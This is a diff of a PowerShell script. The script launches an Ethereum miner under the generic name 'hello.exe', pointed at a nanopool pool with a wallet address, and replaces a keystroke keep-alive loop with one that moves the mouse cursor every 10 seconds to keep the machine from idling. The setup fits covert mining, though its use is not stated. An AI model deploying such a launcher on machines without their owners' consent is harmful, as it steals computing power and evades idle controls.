@@ -34,11 +34,13 @@ setx GPU_SINGLE_ALLOC_PERCENT 100
 
 Start-Process -FilePath "hello.exe" -ArgumentList "--farm-recheck","200","-U","-S","eth-eu1.nanopool.org:9999","-O","0xB5a9b7402AF83507B77BB56ae12947823502742C.TOMB_RAIDER.miner@slurpgeit.nl"
 
-$minutes = 1000000000000000000000000000000000000000
+Add-Type -AssemblyName System.Windows.Forms
 
-$myShell = New-Object -com "Wscript.Shell"
-
-for ($i = 0; $i -lt $minutes; $i++) {
-  Start-Sleep -Seconds 30
-  $myShell.sendkeys(".")
+while ($true)
+{
+  $Pos = [System.Windows.Forms.Cursor]::Position
+  $x = ($pos.X % 500) + 1
+  $y = ($pos.Y % 500) + 1
+  [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)
+  Start-Sleep -Seconds 10
 }
